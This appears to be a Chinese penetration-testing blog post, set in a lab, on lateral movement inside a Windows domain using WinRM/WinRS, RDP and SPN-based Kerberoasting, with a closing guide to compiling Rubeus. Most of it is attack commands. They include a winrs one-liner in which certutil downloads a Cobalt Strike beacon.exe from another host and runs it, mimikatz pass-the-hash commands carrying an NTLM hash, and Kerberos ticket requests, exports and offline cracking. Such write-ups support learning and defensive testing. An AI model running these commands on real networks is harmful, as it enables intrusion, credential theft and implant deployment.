---
title: 横向移动-day4-WinRM/RDP/SPN篇
date: 2024-03-21 17:36 +0800
categories: [内网,横向移动] 
tags: [横向移动,winrm,rdp,spn]
img_path: /img/penetration/
---
本部分主要利用以下三个协议进行内网的横向移动。其中，RDP是比较出名的windows远程管理系统，SPN则在收集信息方面很厉害。接下里我将会具体的介绍每一个服务的利用方法

## 0x001 WinRM&WinRS （5985端口）

winrm代表Windows远程管理，是一种允许管理员远程执行系统管理任务的服务。winrs是客户端。默认情况下支持Kerberos和NTLM身份验证和基本身份验证。

利用条件：双方均需开启winrm rs服务！！！

使用此服务需要管理员级别凭据。

Windows 2008 以上版本默认自动状态，Windows Vista/win7上必须手动启动；
Windows 2012之后的版本默认允许远程任意主机来管理。

### 探测部分

首先我们直接使用cs进行探测，通过扫描端口的操作即可完成（5985）：

![截图](4885c84a9a4138c681d8461f45b780de.png)

==注意：这里我们只开了2台靶机测试而已：==

![截图](c4eb9597fdb995ee650ac9f0d524cb2b.png)

从这里我们已经可以看出主机的域控服务器是存货且具备该端口的！！！ 

### 利用

==注意：这里的利用需要使用本地的cmd（进行代理转发）或者使用靶机的cmd！！! 不能直接用cs里的命令行。==

在正式利用之前，我们首先需要配置正确winrm服务：

```cmd
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}
```

然后，测试连接：

```cmd
域用户
winrs -r:192.168.3.21 -u:god\administrator -p:Admin12345 whoami
本地用户：
winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami
```

![截图](bbca12c9b0b795ecde8132384239b2e1.png)

利用：

```cmd
执行命令
上线cs
winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 "cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe beacon.exe && beacon.exe"
```

## 0x002 RDP（3389端口）

RDP是Windows的远程桌面连接服务，其端口是3389端口。rdp可以明文也可以hash连接。

不出网机器连接rdp方式：

- 直接进行vnc桌面交互再去利用mstsc连接其他主机；（利用出网的机器去连接）
- 开启socks代理，mstsc连接；（代理转发）
- 端口转发，建立隧道，将端口转发出来。

#### 探测扫描

1. 探测服务是否开启：（手动探测）
   
   在cs中输入以下命令：
   ```shell
   shell tasklist /svc | find "TermService"   # 找到对应服务进程的PID
   shell netstat -ano | find "PID值"            # 找到进程对应的端口号
   ```
   
   ![截图](da747badf8b20d8ac2ca98b15d683553.png)
2. cs中主动端口扫描

![截图](0919b893776309dd38d27c0930341767.png)

#### 连接

1. 明文连接：
   
   注意：使用一下这个方法，需要先在cs中设置代理转发！！！
   ```shell
   mstsc /console /v:192.168.3.32 /admin
   ```
   
   ![截图](c509e25f576da0ddf2fae4170d7543d7.png)
   
   ![截图](99587be9bbfffea75ea485e9e1b42b8c.png)
2. 使用hash连接（在cs中）

```shell
本地用户
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c "/run:mstsc /restrictedadmin"
域用户
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:god/administrator /domain:god /ntlm:518b98ad4178a53695dc997aa02d455c "/run:mstsc /restrictedadmin"
```

此时利用mstcs连接时，会默认使用这个hash值！！！

## 0x003 SPN

#### 环境

0day.org

### 介绍

主要利用的就是破解票据里的密码，当pth，ptt用不了时，可以考虑kerberos攻击。     

如需利用需要配置策略加密方式(对比)
黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。
DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。
请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。
黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。
如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。

#### Kerberos利用条件：

采用rc4加密类型票据

#### 工具

Rubeus 检测票据加密方式
kerberoast-master 破解票据
spn是一种探测域中有些服务的协议

### 利用过程

主要就是先用spn查找域内的一些信息，然后可以利用Rubeus自动（或者手动）的去查找域内的kerberos中是否存在使用rc4加密的hash凭证值；如有，则可以使用 tgsrepcrack.py进行破解！！！

#### 收集信息（SPN扫描）

powershell

```powershell
setspn -T 0day.org -q */*
```

![截图](71a5abd1122b5394d4a36d79027df753.png)

当然，也可以特定去查找一些功能。例如我们查看mssql的域内信息：

```powershell
setspn -T 0day.org -q */* | findstr "MSSQL"
```

![截图](b3ce084b0d30b9998c11d3a61eccd698.png)

#### 检测

这里我们可以使用自动化的检测或者使用手动探测。

首先，我们测试自动化形式的探测，使用工具Rubeus：（注意：我的实验是直接在靶机的系统内使用powershell来输入命令的。这里当然我们也可以直接使用cs实验）

```powershell
.\Rubeus.exe kerberoast
```

![截图](7258681193177c582813fb202602b226.png)

除此之外，我们还可以使用手动探测，这里的探测我们首先需要生产票据文件，而后在判断票据的加密类型是什么：

```powershell
# 清空票据信息
klist purge
# 添加新的票据文件（这里为了对比，我添加了两种服务）
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/Srv-DB-0day.0day.org:1433"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ldap/OWA2010SP3.0day.org"
```

![截图](f39921712cc7901e8e051c25832c6165.png)

使用klist查看票据信息，可以发现只有mssql这个服务是使用rc4加密的！

![截图](a6d8ba6aebb9620f9e667ce0893310e4.png)

==注：这里我们添加的服务名都是可以通过前面的spn信息收集到的，可以自行比对一下就知道了！==

```powershell
# 提升权限
.\mimikatz.exe privilege::debug 
# 请求票据
.\mimikatz.exe kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433
# 导出票据
.\mimikatz.exe kerberos::list /export
```

![截图](7cccdd9b0daddb3ddf9918a99e45d0ee.png)

#### 破解hash值

这里我们直接使用tgsrepcrack.py脚本以及字典pass.txt 进行破解

```powershell
python tgsrepcrack.py pass.txt "1-40a00000-jack@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi"
```

![截图](f595602197ea4f5da136d1f217571a00.png)

## 额外（生成Rubeus.exe）

需要下载[.NET8.0](https://dotnet.microsoft.com/zh-cn/download/dotnet/thank-you/runtime-desktop-8.0.0-windows-x64-installer)以及.[NET Core SDK](https://dotnet.microsoft.com/download)，[.NET Framework 3.5](https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/thank-you/net35-sp1-web-installer)进行编译！！！

要使用Visual Studio Code（VS Code）编译Rubeus，一个用C#编写的工具，你需要遵循以下步骤。请注意，VS Code是一个轻量级代码编辑器，而不是一个完整的IDE，所以它通常依赖于外部工具和扩展来编译和运行C#项目。

1. **安装VS Code**：如果你还没有安装VS Code，请从其[官方网站](https://code.visualstudio.com/)下载并安装。
2. **安装.NET Core SDK**：因为Rubeus是用.NET Framework编写的，你需要安装.NET Core SDK来编译它。你可以从[.NET官网](https://dotnet.microsoft.com/download)下载并安装SDK。
3. **安装C#扩展**：在VS Code中，安装C#扩展（由Microsoft提供）。这可以通过VS Code的扩展市场完成。打开VS Code，点击左侧的扩展图标，搜索“C#”，然后选择并安装由Microsoft提供的扩展。
4. **获取Rubeus源代码**：从GitHub克隆Rubeus仓库或下载源代码。
5. **打开项目**：在VS Code中打开Rubeus项目的根目录。VS Code应该自动识别项目并加载必要的资产。
6. **配置构建任务**：你可能需要配置一个构建任务来编译Rubeus。这可以通过在项目根目录中创建一个`.vscode/tasks.json`文件来完成。这个文件定义了如何构建项目。
   
    例如，你的`tasks.json`可能看起来像这样：
   ```json
   {
       "version": "2.0.0",
       "tasks": [
           {
               "label": "build",
               "command": "dotnet",
               "type": "process",
               "args": [
                   "build",
                   "${workspaceFolder}/Rubeus.csproj",
                   "/property:GenerateFullPaths=true",
                   "/consoleloggerparameters:NoSummary"
               ],
               "problemMatcher": "$msCompile",
               "group": {
                   "kind": "build",
                   "isDefault": true
               }
           }
       ]
   }
   ```
   {: file='tasks.json'}
7. **编译项目**：按下`Ctrl + Shift + B`或者从“终端”菜单选择“运行构建任务”来编译项目。如果一切配置正确，VS Code将使用.NET Core SDK来编译Rubeus。
8. **运行和调试**：编译完成后，你可以在VS Code中设置运行和调试配置来运行和调试Rubeus。

请确保你使用这些工具时遵守适当的法律和道德标准。不当使用可能导致法律后果。
